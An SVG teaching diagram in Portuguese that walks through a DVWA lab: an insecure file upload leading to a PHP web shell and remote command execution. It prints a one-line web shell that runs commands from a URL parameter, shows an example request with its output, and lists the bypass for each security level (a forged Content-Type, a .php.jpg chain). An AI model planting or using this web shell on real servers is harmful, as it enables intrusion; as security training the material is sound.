<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 520" role="img" aria-labelledby="t d">
  <title id="t">Do upload de um arquivo .php à execução de comandos no servidor</title>
  <desc id="d">O caminho de um upload inseguro até a execução remota de código, em cinco passos em sequência. Passo 1: o atacante envia pelo formulário de upload um arquivo chamado shell.php que contém o código PHP system de dólar underscore GET cmd. Passo 2: o servidor grava o arquivo na pasta pública hackable barra uploads, servida pelo Apache. Passo 3: o atacante pede pelo navegador a URL dessa pasta mais shell.php com o parâmetro cmd igual a id. Passo 4: o Apache, ao servir um arquivo .php, executa o código PHP como o usuário www-data, e o PHP chama o comando id no sistema. Passo 5: resultado, execução remota de código (RCE): o comando roda no servidor e devolve uid igual a 33 www-data. Abaixo, uma faixa mostra o funil de validações por nível do DVWA: no low não há checagem; no medium checa-se o Content-Type, que é forjável; no high checa-se a extensão e o getimagesize; no impossible a imagem é reconvertida, apagando qualquer código embutido. A lição: guardar o arquivo numa pasta que executa PHP é o que transforma um upload em RCE.</desc>
  <style>
    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
    .t { font-size: 16px; font-weight: 700; }
    .h { font-size: 12.5px; font-weight: 700; }
    .b { font-size: 11.5px; }
    .code { font-size: 11px; }
    .s { font-size: 10px; fill: #9fb0a6; }
    .g { fill: #5ee08a; }
    .c { fill: #5cc8d8; }
    .y { fill: #e8c46a; }
    .r { fill: #ef7b6b; font-weight: 700; }
    .boxr { fill: #241717; stroke: #ef7b6b; stroke-width: 1.4; }
    .box { fill: #16201b; stroke: #2c3a33; stroke-width: 1.3; }
    .sh { fill: #1b2a3a; stroke: #5cc8d8; stroke-width: 1.3; }
    .arrow { stroke: #5cc8d8; stroke-width: 2; marker-end: url(#ar); fill: none; }
  </style>
  <defs>
    <marker id="ar" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#5cc8d8"/></marker>
  </defs>
  <rect width="900" height="520" fill="#121815"/>
  <text class="t" x="24" y="30">Upload inseguro → web shell → execução remota de código (RCE)</text>

  <!-- step 1 -->
  <rect class="boxr" x="24" y="56" width="200" height="92" rx="9"/>
  <text class="h r" x="36" y="78">1. Atacante envia</text>
  <text class="b" x="36" y="98">shell.php</text>
  <text class="code c" x="36" y="118">&lt;?php system(</text>
  <text class="code c" x="36" y="134">$_GET["cmd"]); ?&gt;</text>
  <path class="arrow" d="M228,102 L250,102"/>

  <!-- step 2 -->
  <rect class="box" x="254" y="56" width="200" height="92" rx="9"/>
  <text class="h g" x="266" y="78">2. Servidor grava</text>
  <text class="s" x="266" y="98" style="font-size:10.5px">sem checar o conteúdo</text>
  <text class="code c" x="266" y="120">/hackable/uploads/</text>
  <text class="code c" x="266" y="136">shell.php</text>
  <path class="arrow" d="M458,102 L480,102"/>

  <!-- step 3 -->
  <rect class="boxr" x="484" y="56" width="200" height="92" rx="9"/>
  <text class="h r" x="496" y="78">3. Atacante acessa</text>
  <text class="s" x="496" y="98" style="font-size:10.5px">pelo navegador</text>
  <text class="code c" x="496" y="120">GET .../uploads/</text>
  <text class="code c" x="496" y="136">shell.php?cmd=id</text>
  <path class="arrow" d="M684,102 L706,102"/>

  <!-- step 4 (second row, right-to-left visual via down arrow) -->
  <rect class="box" x="714" y="56" width="162" height="92" rx="9"/>
  <text class="h y" x="726" y="78">4. Apache</text>
  <text class="s" x="726" y="98" style="font-size:10.5px">serve .php</text>
  <text class="b" x="726" y="120">executa o PHP</text>
  <text class="s" x="726" y="138" style="font-size:10.5px">como www-data</text>
  <path class="arrow" d="M795,148 L795,196"/>

  <!-- step 5 -->
  <rect class="sh" x="484" y="200" width="392" height="74" rx="9"/>
  <text class="h c" x="500" y="224">5. RCE — o comando roda NO servidor</text>
  <text class="code g" x="500" y="248">uid=33(www-data) gid=33(www-data) groups=33(www-data)</text>
  <text class="s" x="500" y="266" style="font-size:10.5px">a partir daqui o atacante roda qualquer comando: ler arquivos, abrir uma reverse shell...</text>

  <!-- validation funnel -->
  <text class="h y" x="24" y="328">O que cada nível do DVWA valida no upload — e por onde se passa</text>
  <rect class="box" x="24" y="344" width="205" height="150" rx="9"/>
  <text class="h" x="36" y="366">low</text>
  <text class="s" x="36" y="388" style="font-size:10.5px">nenhuma checagem</text>
  <text class="b r" x="36" y="410">sobe shell.php direto</text>

  <rect class="box" x="237" y="344" width="205" height="150" rx="9"/>
  <text class="h" x="249" y="366">medium</text>
  <text class="s" x="249" y="388" style="font-size:10.5px">checa o Content-Type</text>
  <text class="s" x="249" y="404" style="font-size:10.5px">enviado pelo cliente</text>
  <text class="b r" x="249" y="428">forje image/jpeg</text>
  <text class="s" x="249" y="448" style="font-size:10.5px">(no Burp) e ele passa</text>

  <rect class="box" x="450" y="344" width="205" height="150" rx="9"/>
  <text class="h" x="462" y="366">high</text>
  <text class="s" x="462" y="388" style="font-size:10.5px">extensão jpg/png</text>
  <text class="s" x="462" y="404" style="font-size:10.5px">+ getimagesize()</text>
  <text class="b y" x="462" y="428">precisa encadear</text>
  <text class="s" x="462" y="448" style="font-size:10.5px">(.php.jpg + inclusão)</text>

  <rect class="box" x="663" y="344" width="213" height="150" rx="9" style="stroke:#5ee08a"/>
  <text class="h g" x="675" y="366">impossible</text>
  <text class="s" x="675" y="388" style="font-size:10.5px">reconverte a imagem</text>
  <text class="s" x="675" y="404" style="font-size:10.5px">(re-encode) + token</text>
  <text class="b g" x="675" y="428">apaga o código</text>
  <text class="s" x="675" y="448" style="font-size:10.5px">embutido: bloqueado</text>
</svg>
